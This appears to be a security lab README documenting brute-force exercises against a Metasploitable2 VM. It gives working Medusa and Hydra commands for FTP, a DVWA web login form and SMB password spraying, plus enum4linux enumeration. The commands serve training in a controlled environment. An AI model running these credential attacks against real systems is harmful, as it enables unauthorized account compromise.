# Brute_Force_in_Metasploitable2
Documentation of brute force tests using Medusa and Hydra in a Metasploitable2 controlled environment.

## Objective
Execute simulated attacks: brute force on FTP, automation of login attempts in web forms (DVWA), and password spraying on SMB with user enumeration.

## Used Resources 
- VM PfSense 192.168.1.1
- VM Kali Linux 192.168.1.100
- VM Metasploitable2 192.168.1.106
- images/ : 
- logs/ :
- wordlists/ : Contains the username and password wordlists used in the simulation.

## Brute Force FTP

```
medusa -h 192.168.1.106 -U users.txt -P pass.txt -M ftp
```

## DVWA Web Form 

```
hydra -L users.txt -P pass.txt 192.168.1.106 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
```

## Password Spraying SMB

```
enum4linux -a 192.168.1.106 | tee enum4_output.log
```

```
medusa -h 192.168.1.106 -U users.txt -P pass.txt -M smbnt -t 2
```

```
smbclient -L //192.168.1.106 -U msfadmin
```